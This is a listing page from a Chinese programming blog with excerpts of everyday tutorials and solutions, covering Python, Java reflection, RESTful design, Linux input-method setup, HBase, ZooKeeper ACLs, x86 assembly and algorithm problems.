<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08678d3f18ed6d2f01679fcb6e92e0a0/" rel="bookmark">
			已经各商品中奖概率，求根据中奖概率进行中奖显示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import random list_more = list(range(1,101)) #一等奖 10% list_1 = random.sample(list_more,10) #二等奖 20% list_2 = random.sample(list(set(list_more)-set(list_1)),20) #三等奖 30% list_3 = random.sample(list(set(list_more)-set(list_1)-set(list_2)),30) #四等奖 40% list_4 = random.sample(list(set(list_more)-set(list_1)-set(list_2)-set(list_3)),40) print list_1,len(list_1) print list_2,len(list_2) print list_3,len(list_3) print list_4,len(list_4) a = raw_input("开始抽奖:(Y/N)" ) if a.lower() == "y": x = random.randint(1,100) print x if x in list_1: print ("恭喜一等奖") elif x in list_2: print ("恭喜二等奖") elif x in list_3: print ("恭喜三等奖") else: print ("恭喜四等奖") 这样保证每一次进行抽奖前，奖池中对应的个的中奖池号码是随机生成的，提高了逻辑的严谨性
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eaae9d784a20a7c53fb04de792d898a3/" rel="bookmark">
			七、RESTflu架构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		RESTflu架构 要理解RESTful架构，最好的方法就是去理解Representational State Transfer这个词组到底是什么意思，它的每一个词代表了什么涵义。（资源表现层状态转化）
（1）资源（Resources）
REST的名称"表现层状态转化"中，省略了主语。“表现层"其实指的是"资源”（Resources）的"表现层"。
所谓"资源"，就是网络上的一个实体，或者说是网络上的一个具体信息。它可以是一段文本、一张图片、一首歌曲、一种服务，总之就是一个具体的实在。你可以用一个URI（统一资源定位符）指向它，每种资源对应一个特定的URI。要获取这个资源，访问它的URI就可以，因此URI就成了每一个资源的地址或独一无二的识别符。
所谓"上网"，就是与互联网上一系列的"资源"互动，调用它的URI。
（2）表现层（Representation）
"资源"是一种信息实体，它可以有多种外在表现形式。我们把"资源"具体呈现出来的形式，叫做它的"表现层"（Representation）。
比如，文本可以用txt格式表现，也可以用HTML格式、XML格式、JSON格式表现，甚至可以采用二进制格式；图片可以用JPG格式表现，也可以用PNG格式表现。
URI只代表资源的实体，不代表它的形式。严格地说，有些网址最后的".html"后缀名是不必要的，因为这个后缀名表示格式，属于"表现层"范畴，而URI应该只代表"资源"的位置。它的具体表现形式，应该在HTTP请求的头信息中用Accept和Content-Type字段指定，这两个字段才是对"表现层"的描述。
（3）状态转化（State Transfer）
访问一个网站，就代表了客户端和服务器的一个互动过程。在这个过程中，势必涉及到数据和状态的变化。
互联网通信协议HTTP协议，是一个无状态协议。这意味着，所有的状态都保存在服务器端。因此，如果客户端想要操作服务器，必须通过某种手段，让服务器端发生"状态转化"（State Transfer）。而这种转化是建立在表现层之上的，所以就是"表现层状态转化"。
客户端用到的手段，只能是HTTP协议。具体来说，就是HTTP协议里面，四个表示操作方式的动词：GET、POST、PUT、DELETE。它们分别对应四种基本操作：GET用来获取资源，POST用来新建资源（也可以用于更新资源），PUT用来更新资源，DELETE用来删除资源。
综合上面的解释，我们总结一下什么是RESTful架构：
（1）每一个URI代表一种资源；
（2）客户端和服务器之间，传递这种资源的某种表现层；
​ （3）客户端通过四个HTTP动词，对服务器端资源进行操作，实现"表现层状态转化"。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0cdbef98d3a3a86a4850397d9538ddc3/" rel="bookmark">
			sublime报错——SyntaxError: Non-ASCII character &#39;\xe5&#39; in file
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 报错提示：
SyntaxError: Non-ASCII character '\xe5' in file /Users/... ...
原因：Python默认以ASCII码作为编码方式，这个错误是说在文件中存在着非法的ASCII字符（有可能是源码中存在中文）
解决办法：在脚本第一行加上： #coding=utf-8 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c14ea34084d1a0e8fe2e572050a25c7/" rel="bookmark">
			Java： Hook技术
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、什么是Hook Hook翻译成中文就是勾子的意思，在java中它表示在事件到达终点前进行拦截或监控的一种行为。
二、Hook的实现 实现hook我们必须要知道java的反射和动态代理。
1、反射
反射是java的查看、检测、修改自身的一种行为。
在编译阶段，编译器将我们编写的java文件编译成.class文件。而在运行期，jvm又将.class文件通过类加载器ClassLoader加载一个类对应的Class对象到内存当中。通过修改Class对象，达到我们查看、检测、修改自身的行为。
Class clazz = Class.forName("android.com.test.TestClass"),方式加载类的class文件。
生成实例的方法不一定通过new ，可通过下面的方法获取Class对象对应的实例
Constructor constructor = clazz.getConstructor(); TestClass o = （TestClass）constructor.newInstance(); 当然，构造函数可能有多个，你应该通过获取他的所有构造函数。了解到他的构造函数之后再使用上面的方法，不然会报错
Constructor[] constructors = clazz.getDeclaredConstructors(); for (Constructor constructor : constructors){ constructor.setAccessible(true); //可能有些构造函数你的权限不够，让其可能反射 Class[] params = constructor.getParameterTypes(); //某个构造函数的参 Log.i("tag",String.valueOf(params.length)); //看看构造函数参数的长度 for (Class p : params) { Log.i("tag","参数类型的名字"+p.getName()); //看看这个构造函数是什么类型 } } } 同理，通过class类对象，可以获取对象的方法。动态代理中需要在方法拦截。
Methods method[] = clazz.getDeclaredMethods(); 获取对象的域，
Field[] fields = clazz.getDeclaredFields（） 获取对象的注解，我们ButterKnife就是运用到了这个。
Annotation[] annotations = hookUserClass.getDeclaredAnnotations(); for (Annotation annotation : annotations){ Log.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0c14ea34084d1a0e8fe2e572050a25c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/66f10067ef1bb217be12da103cd55ad9/" rel="bookmark">
			JavaScript基础（十五）多态、多继承、设计模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		多态、多继承、设计模式 多态多继承单继承多继承 设计模式简单工厂安全工厂抽象工厂适配器模式 多态 多态：同一个方法多种调用方式
例如：有一个需求——不传参数返回10，1个参数返回10+参数，2个参数返回参数和
function add(){ var args = arguments, len = arguments.length; switch(len){ case 0: return 10; case 1: return 10 + args[0];	case 2: return args[0] + args[1]; } } console.log(add(), add(3), add(3, 14)); // 10 13 17 // 用多态实现 function Add(){ // 无参数 function zero(){ return 10; } // 一个参数 function one(num){ return 10 + num; } // 两个参数 function two(num1, num2){ return num1 + num2; } // 相加共有的方法 this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/66f10067ef1bb217be12da103cd55ad9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e2dd77e0ca5bc1b89f1932364224b373/" rel="bookmark">
			Linux下fcitx的安装方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		只是介绍了图形化界面下基本的安装指令和基本的配置方法 1.安装之前 在system settings&gt;language support中，选择Install/Remove Languages，选择chinese(simplified)&gt;apply使系统支持中文。
2.安装 debian： sudo apt remove fcitx*	//卸载掉之前的 sudo apt-get install fcitx fcitx-table-wbpy fcitx-googlepinyin im-config centos/redhat： #安装源 yum install epel-releas # 搜狗拼音输入法 yum install sogou-pinyin sogou-pinyin-skins # 谷歌拼音输入法 yum install fcitx-googlepinyin fcitx-cloudpinyin # Rime中州韵输入法 yum install fcitx-rime fcitx-cloudpinyin # 安装Fcitx图形配置界面 yum install fcitx-configtool 3.配置： debian： 命令行输入
im-config 根据弹出的窗口，选择 fcitx 输入法即可。
centos/redhat： 1.禁止 ibus 自动启动
sudo setfacl -m u:用户名:rw /usr/bin/ibus-daemon 2.结束 ibus 守护进程
sudo pkill ibus-daemon 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e2dd77e0ca5bc1b89f1932364224b373/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/879b113b761cace3901198eebd5296bb/" rel="bookmark">
			浏览ASP时遇到以下错误： Microsoft VBScript 运行时错误 错误 &#39;800A01AD&#39; ActiveX 部件不能创建对象:&#39;NetBox.HttpServer&#39;
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		版权声明：本文为博主原创文章，未经博主允许不得转载。https://blog.csdn.net/qq_42680327
博主刚刚开始学习ASP动态网页的时候，跟你们一样，安装启动AspWebserver2005，本以为打开就能运行，没有想到，上来就给我报错，下面我就以我自己的电脑为例，如图：
报错的原因：netbox问题， 无法创建NetBox.HttpServer，错误800A01AD
解决的办法： 大家先打开安装AspWebserver2005的安装包，小编就默认安装在：C:\Program Files\小旋风AspWebServer，然后用记事本打开main.box文件夹，在CreateObject前面加上NetBox.,就可以了,如图：
有什么不懂的，可以随时给小编留言，小编会继续为大家服务......
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bf49832a402be61af3ffe1f1f1e6399/" rel="bookmark">
			Sequelize 中文API文档－1. 快速入门、Sequelize类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果是学习前端的同学加个微信(id:cannywill)做个朋友，能帮尽量帮，也一起进步鸭
Sequelize类是引用sequlize模块后获取一个顶级对象，我们通过它来创建sequlize实例，也可以通过该对象来获取模内其它对象的引用，如：Utils工具类、Transaction事务类等。创建实例后，可以通过实例来创建或定义Model（模型）、执行查询、同步数据库结构等操作。
快速入门 1.1 安装1.2 建立连接1.3 model定义1.4 PromiseSequelize类 2.1 new Sequelize() - 实例化2.2 new Sequelize() - 通过URI实例化2.3 sequelize.models - 实例中已定义的模型2.4 sequelize.define() - 模型定义2.5 Sequelize - 顶级对象2.6 Utils - 工具类2.7 Promise - Promise对象2.8 QueryTypes - 查询类型枚举2.9 Validator - validator.js对象2.10 Transaction - 事务对象2.11 Deferrable - 延时对象2.12 Instance - 实例对象2.13 Association - 联合关系对象2.14 Error - 错误对象2.15 ValidationError - 验证失败错误对象2.16 DatabaseError - 数据库错误对象2.17 TimeoutError - 查询超时错误对象2.18 UniqueConstraintError - 唯一性错误对象2.19 ExclusionConstraintError - 排出约束错误对象2.20 ForeignKeyConstraintError - 外键约束错误对象2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4bf49832a402be61af3ffe1f1f1e6399/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e327170de3f339e13fb9b773969aba61/" rel="bookmark">
			C&#43;&#43;：求平均分（针对基本数据类型的应用）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 C++：求平均分 问题描述
已知某班有男同学x位，女同学y位，x位男生的平均分为87，y位女生的平均分是85分，问全体同学的平均分是多少分。
输入描述
两个整数，分别为x和y的值。
输出描述
一位数可能是整数也可能是浮点数。
输入示例
1 1
输出示例
86
#include &lt;iostream&gt; using namespace std; int main(){ int x, y; //声明变量。 double z; //声明变量，浮点型，“z”表示本题所要求的平均分。 cin &gt;&gt; x &gt;&gt; y; //依次输入男同学、女同学的人数。 z = (87 * x + 85 * y) / (x + y); //计算出男、女同学的总分再除以人数求得平均分。 cout &lt;&lt; z &lt;&lt; endl; //输出平均分。 return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ec8bff1f07c41c9a8ab6999120f87705/" rel="bookmark">
			Codeforces Contest 1075 problem E Optimal Polygon Perimeter —— 找凸包中曼哈顿距离之和最大的多边形
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		You are given n points on the plane. The polygon formed from all the n points is strictly convex, that is, the polygon is convex, and there are no three collinear points (i.e. lying in the same straight line). The points are numbered from 1 to n, in clockwise order.
We define the distance between two points p1=(x1,y1) and p2=(x2,y2) as their Manhattan distance:
d(p1,p2)=|x1−x2|+|y1−y2|.
Furthermore, we define the perimeter of a polygon, as the sum of Manhattan distances between all adjacent pairs of points on it; if the points on the polygon are ordered as p1,p2,…,pk (k≥3), then the perimeter of the polygon is d(p1,p2)+d(p2,p3)+…+d(pk,p1).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ec8bff1f07c41c9a8ab6999120f87705/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d281cdb9c1c80cc2c8d6e731ac59e18b/" rel="bookmark">
			Hbase存储详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Hbase存储详解
一、概述 Hbase是建立的hdfs之上，提供高可靠性、高性能、列存储、可伸缩、实时读写的数据库系统。
它介于nosql和RDBMS之间，仅能通过主键(row key)和主键的range来检索数据，仅支持单行事务(可通过hive支持来实现多表join等复杂操作)。主要用来存储非结构化和半结构化的松散数据。
与hadoop一样，Hbase目标主要依靠横向扩展，通过不断增加廉价的商用服务器，来增加计算和存储能力。
Hbase中的表一般有这样的特点：
1 大：一个表可以有上亿行，上百万列
2 面向列:面向列(族)的存储和权限控制，列(族)独立检索。
3 稀疏:对于为空(null)的列，并不占用存储空间，因此，表可以设计的非常稀疏。
二、逻辑视图 Hbase以表的形式存储数据。表有行和列组成。列划分为若干个列族(row family)
Row Key 与nosql数据库们一样,row key是用来检索记录的主键。访问Hbase table中的行，只有三种方式：
1 通过单个row key访问
2 通过row key的range
3 全表扫描
Row key行键 (Row key)可以是任意字符串(最大长度是 64KB，实际应用中长度一般为 10-100bytes)，在Hbase内部，row key保存为字节数组。
存储时，数据按照Row key的字典序(byte order)排序存储。设计key时，要充分排序存储这个特性，将经常一起读取的行存储放到一起。(位置相关性)
注意：
字典序对int排序的结果是1,10,100,11,12,13,14,15,16,17,18,19,2,20,21,…,9,91,92,93,94,95,96,97,98,99。要保持整形的自然序，行键必须用0作左填充。
行的一次读写是原子操作 (不论一次读写多少列)。这个设计决策能够使用户很容易的理解程序在对同一个行进行并发更新操作时的行为。
列族 Hbase表中的每个列，都归属与某个列族。列族是表的chema的一部分(而列不是)，必须在使用表之前定义。列名都以列族作为前缀。例如courses:history，courses:math 都属于courses 这个列族。
访问控制、磁盘和内存的使用统计都是在列族层面进行的。实际应用中，列族上的控制权限能帮助我们管理不同类型的应用：我们允许一些应用可以添加 新的基本数据、一些应用可以读取基本数据并创建继承的列族、一些应用则只允许浏览数据(甚至可能因为隐私的原因不能浏览所有数据)。
时间戳 Hbase中通过row和columns确定的为一个存贮单元称为cell。每个 cell都保存着同一份数据的多个版本。版本通过时间戳来索引。时间戳的类型是 64位整型。时间戳可以由Hbase(在数据写入时自动 )赋值，此时时间戳是精确到毫秒的当前系统时间。时间戳也可以由客户显式赋值。如果应用程序要避免数据版本冲突，就必须自己生成具有唯一性的时间戳。每个 cell中，不同版本的数据按照时间倒序排序，即最新的数据排在最前面。
为了避免数据存在过多版本造成的的管理 (包括存贮和索引)负担，Hbase提供了两种数据版本回收方式。一是保存数据的最后n个版本，二是保存最近一段时间内的版本(比如最近七天)。用户可以针对每个列族进行设置。
Cell 由{row key, column(= + ), version} 唯一确定的单元。cell中的数据是没有类型的，全部是字节码形式存贮。
在HBase每个cell存储单元对同一份数据有多个版本，根据唯一的时间戳来区分每个版本之间的差异，时间戳可以由HBase(在数据写入时自动)赋值，此时时间戳是精确到毫秒的当前系统时间，也可以由自己显示指定，按照时间戳倒序排序，最新的数据排在最前面。
三、物理存储 1 Table Table中的所有行都按照row key的字典序排列，Table 在行的方向上分割为多个Hregion。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d281cdb9c1c80cc2c8d6e731ac59e18b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/677741eb36fd830a8aa86cce3a045128/" rel="bookmark">
			13-ZF标志位，JB和JNB跳转指令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. ZF标志位 这一节我们将来学习一下标志寄存器的ZF（Zero Flag）零标志位。
对于ZF标志位，当运算结果为0的时候，那么ZF=1，当运算结果不为0的时候，ZF=0。
例如下面这段汇编指令：
mov ax,10 mov dx,10 sub ax,dx 但sub指令一旦运行，就会修改寄存器里面的值，当ax和dx进行减法运算的结果为0时，那么ZF标志位就会被置为1。有些时候，我们需要判断一些两个数相减是不是等于0，可我们又不希望影响了寄存器里面的值，这个时候，我们可以使用cmp指令代替sub指令。
cmp指令（compare），cmp指令用法如下：
cmp ax,dx cmp和sub都是进行减法运算，但cmp只影响标志寄存器；而sub不仅会影响标志寄存器，还会影响被减数所在的寄存器或者内存。因此，当需要判断两个数字是不是相等，就可以使用cmp指令。
当然我们也可以使用cmp指令判断被加数是不是大于加数，只需要观察CF标志位就可以了。
2. JB和JNB JB指令（英文：jump when below）可以简单理解为是一个跳转指令，当CF标志位为1的时候才会跳转。
而JNAE指令（英文：jump when not above or equal）和JB指令所做的事情几乎是一模一样的，也就是说你既可以使用JB指令，也可以使用JNAE指令。
JNB指令（英文：jump when not below）也是用于跳转的，不过JNB指令只在CF标志位为0的时候才跳转，JAE指令（英文：jump when above or equal）和JNB指令是完成一模一样的事情。
单独使用JB和JNB指令并没有太大的意义，通常都是和cmp指令一起使用，它们一组合，就会产生化腐朽为神奇的效果。我们知道CMP运算之后会影响CF的值，然后JB或者JNB指令会根据CF决定跳转代码。
有了这些指令，就可以让我们的程序具有一定的“智能和思考”。比如设计一个程序功能：输入一个年龄，如果这个年龄是18岁以上（包括18）岁，就在屏幕上显示“Adult”，如果这个年龄小于18岁，在屏幕上显示“Minor”
汇编代码如下：
;文件说明：005.asm ;说明：JB指令使用 mov ax,0xB800 mov es,ax	;指定显示段 mov ax,0x07c0 mov ds,ax	;指定数据段 mov si,0	;初始化数据段	偏移寄存器(源地址) mov di,0	;初始化显示段	偏移寄存器(目的地址) jmp near code Age: db 16	;指定年龄,你也可以自行指定年龄数 Adult: db 'Adult' Minor: db 'Minor' code: mov al,byte[ds:Age] cmp al,18	;如果比18小，根据CF标志位变化，使用JB指令跳转到指定位置 JB PrintMinor PrintAdult:	;打印成年 mov cx,Minor-Adult	;确定要打印的字节数 mov si,Adult jmp PrintLoop PrintMinor:	;打印未成年 mov cx,code-Minor	;确定要打印的字节数 mov si,Minor PrintLoop: mov al,[ds:si] mov byte [es:di],al inc di mov byte [es:di],0x07 inc si inc di loop PrintLoop end: jmp 0x07C0:end times 510-($-$$) db 0x00 db 0x55,0xAA 指定年龄为16，执行结果如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/677741eb36fd830a8aa86cce3a045128/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf0851973362ca7993a1ce44fd123c91/" rel="bookmark">
			跳跃游戏 python实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目描述 给定一个非负整数数组，你最初位于数组的第一个位置。
数组中的每个元素代表你在该位置可以跳跃的最大长度。
判断你是否能够到达最后一个位置。
示例 1:
输入: [2,3,1,1,4]
输出: true
解释: 从位置 0 到 1 跳 1 步, 然后跳 3 步到达最后一个位置。
示例 2:
输入: [3,2,1,0,4]
输出: false
解释: 无论怎样，你总会到达索引为 3 的位置。但该位置的最大跳跃长度是 0 ， 所以你永远不可能到达最后一个位置。
解题思路 这位播主写的很好，讲解了使用动态规划，和贪婪算法两种解法（这里感慨一下：贪婪算法，我已经基本快想出来了，只要稍微改变一下就OK了，可是最后还是忍不住看了答案。。。。遗憾，所以大家在刷题目的时候碰到不会的，多给自己一点时间）
python代码实现 class Solution: @staticmethod def canJump_greedy(nums): """ 使用贪心算法求解 https://blog.csdn.net/shinanhualiu/article/details/50550825 max_arrived表示的是截至到i位置所能到达的最远距离 :type nums: List[int] :rtype: bool """ len_nums=len(nums) max_arrived=0 for i,num in enumerate(nums): if i==0: max_arrived=i+num elif max_arrived&gt;=i: max_arrived=(max(i+num,max_arrived)) else: return False if max_arrived&gt;=len_nums-1: return True return False @staticmethod def canJump_dp(nums): "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bf0851973362ca7993a1ce44fd123c91/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83121807665f730e74bd6c8a087b612f/" rel="bookmark">
			Android Thread 浅析和使用小结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.线程的状态 线程包括几个状态 创建（new) Thread thread=new Thread;
就绪（runnable） thread.start();
运行（running） 线程只能从就绪状态进入到运行状态
阻塞（blocked） 该状态是线程因为某种原因放弃了cpu使用权限，暂时停止运行。
阻塞的情况有三种：
1）等待：调用了wait(),线程进入等待阻塞状态。此时线程需要等待某项工作的完成
2）同步：当线程获取synchronized同步锁失败（此时锁被其他线程暂时占用），线程进入同步阻塞状态。此时该线程需要等其他线程使用完锁。
3）其他：当调用了sleel()或join()或发出了I/O请求时，线程进入阻塞状态。此时线程需要等sleep()时间结束或被打断、join()中断、I/O处理完成，线程才能重新进入就绪状态。
消亡（dead） 1)线程中run()或call()执行完成，正常结束
2)线程抛出Exception或error，异常退出
3)线程调用stop()结束—容易导致死锁，不建议
注意：同一时刻线程都只有一种状态，通过线程中getState方法可以获取线程的状态。
二.线程创建的三种方式 1)继承Thread
private class MyThread extends Thread { SyncThread(String name) { super(name); } @Override public void run() { //执行耗时操作 } } 2)实现Runnable接口
private class MyThread implements Runnable { @Override public void run() { //执行耗时操作 } } 3） 匿名内部类创建线程
new Thread(new Runnable() { public void run() { //执行耗时操作 } }).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/83121807665f730e74bd6c8a087b612f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7737965a5ed01ad56237f71de9fc43b/" rel="bookmark">
			将数组排序所需的最小交换次数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题：最小交换次数 问题描述： 给出一个具有N个不同值的数组A[]，找出将数组排序所需的最小交换次数。
输入： 第一行包含一个整数T，表示测试用例的数量。接下来会有T个测试用例，对于每个测试用例，包含一个整数N表示数组A[]中元素的个数，接下来一行为数组A[]，包含N个用空格分开的整数。
数据规模：（1&lt;=T&lt;=100; 1&lt;=N&lt;=100; 1&lt;=A[i]&lt;=1000）
输出 对于每个测试用例，输出一个整数表示将数组排序所需的最小交换次数。
样例输入输出 数组A[]输出4 3 2 121 5 4 3 22 tips:该问题有两种问法，任意两个元素均可交换或只能相邻两个元素交换。解法不同，本题为任意两元素可交换。
解题思路 本题解法如下，首先将数组***A***排序得到***A’*** ,遍历数组A中元素，假设当前元素为A[i]， ①A[i]在正确的位置（即排序后应在的位置）上，跳过，考虑下一元素。
② 若A[i]不在正确的位置上，假设其排序后的正确位置为j，则将A[i]与A[j]交换。此时i位置上的元素为A[j]的值，记为A[i]’。若A[i]'是在正确的位置上，则停止，否则，重复②步骤。
tips:使用一个标记数组，访问过的元素，不再考虑。
例子： 遍历数组[1 5 4 3 2]，
1在正确的位置上，跳过；
5不在正确的位置上，将其与2交换。2交换到了排序后的正确位置，停止；
4不在正确的位置上，将其与3交换。3交换到了排序后的正确位置，停止；
算法结束，共交换两次。
循环节 解题思路的1小节中，②步骤的循环操作涉及一个理论概念：循环节。
在一次操作中，把该次操作的所有元素都交换到正确位置上的所有操作形成的环，也就是循环节。
2小节的例子中，有三个循环节，分别为【1】【5, 2】;【4, 3】
公式 //假设数组的循环节个数为lops 最小交换次数min_swaps = len(A) - lops 源码 python版本的代码实现
def min_swaps(nums): # mp记录排序后数值应在的正确位置 mp = {} sort_nums = sorted(nums) for i in range(len(sort_nums)): mp[sort_nums[i]] = i # 循环节个数 lops = 0 # 该位置的数是否被访问过 flags = [] for i in range(len(nums)): flags.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e7737965a5ed01ad56237f71de9fc43b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d0232ac41b26b98fecfb13bd5a021d6/" rel="bookmark">
			zookeeper搭建以及acl权限访问控制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		搭建zookeeper环境 1. 搭建zookeeper环境 官网下载文件，解压至服务器cp zoo.cfg.template zoo.cfg基本没有要修改的配置，默认配置就可以启动 1. 启动zookeeper ./bin/zkServer.sh start 2. 通过zk客户端连接刚才启动的zk服务 ./bin/zkCli.sh 3. 创建一个节点测试一下有没有问题 create /test mytest ls /test get /test 启动成功，并成功创建、访问节点。
zk访问权限控制 ACL(Access Control Lists):zookeeper中定义了五种控制权限: CREATE：创建当前节点的子节点READ：获取节点数据和子节点列表WRITE：更新节点数据DELETE：删除子节点的权限ADMIN：设置节点ACL的权限。
其中CREATE和DELETE这两种权限都是针对子节点的权限控制。 ZooKeeper提供了如下几种验证模式（scheme）： digest：Client端由用户名和密码验证，譬如user:password，digest的密码生成方式是Sha1摘要的base64形式auth：不使用任何id，代表任何已确认用户。ip：Client端由IP地址验证，譬如172.2.0.0/24world：固定用户为anyone，为所有Client端开放权限（默认）super：在这种scheme情况下，对应的id拥有超级权限，可以做任何事情(cdrwa） 现在，我们的zk节点需要进行权限设置 workd 刚刚创建的test节点，我们来看一下test节点的权限是什么样的 getAcl /test 节点权限是world，也就是默认权限，为所有client端开放，这样肯定是不安全的，我们先基于auth模式进行权限的控制
auth 模式进行权限控制 3. auth加密形式(还是依赖以上创建的test节点进行权限控制) 4. 为节点创建auth权限认证方式(drawc为上述具体操作权限) setAcl /test auth:user:123:drawc 5. 登陆解密流程 1. 创建用户上下文 addauth digest user:123 2. 设置登陆 setAcl /test auth:user:123:drawc 6. 现在看一下是否能访问得了该节点，发现是没有问题的，因为现在权限上下文中是包含user:123 的信息的 ls /test 7. 现在看一下/test节点的权限信息 getAcl /test 现在，成功的为节点设置了访问权限，清除一下上下文，再次进行访问，或者直接退出当前客户端重新登陆一下，访问/test节点，会发生什么
退出客户端 quit 重新连接客户端 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3d0232ac41b26b98fecfb13bd5a021d6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f659e92892e14a3b97ba6b6e90749dba/" rel="bookmark">
			用H5大屏数据可视化开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目中需要做一个数据展示用的看板，初接到任务觉得这个没有什么难度，做个漂亮的网页浏览器全屏就可以了。可是实际做的过程中碰见了问题。
第一：浏览器不能有横向和纵向的滚动条，没有鼠标的滚动操作过程。
第二：有各类尺寸的屏，除了在九宫格拼接屏上完美显示，还要同时满足普通用户的电脑端显示。电脑的客户分辨率可能是1399*768或1920*1080等各类尺寸的分辨率。
利用传统网页制作从上到小的制作方式已经不能满足需求了。例如：
下面的对比图：一个是1902*1080 ,一个是1366*768的屏幕，很明显高分辨率的屏显示的内容多些。
那么如何做到大屏上内容动态调整适合屏幕展示呢？
响应式媒体查询、rem,js控制尺寸还是其他方法呢？最开始觉得响应式媒体查询就可以满足我的需求，的确是可以精细化控制，可是时间有限，容不得我花费较长时间，而且写多套尺寸的css 我觉得工作量不少，界面元素一多，要照顾的地方也非常多。js控制也尝试过，不适合，要resize调整的项目多。总之，纠结了半天。
后来买了一个基础版的DataV，做了开发，但DataV的可编程型不高，要多花费银子买企业版！最后问题还是回归到要H5制作大屏的需求上来。DataV的适屏做的很好，何不借鉴下呢，F12查看源码，看到了body 的scale css属性，大概就明白了做法，于是乎开工做。原理就是用一个基础尺寸比如1920*1080来做开发和布局，最后利用客户端浏览器的尺寸，按一定的计算比例做缩放。
关键的代码片段：
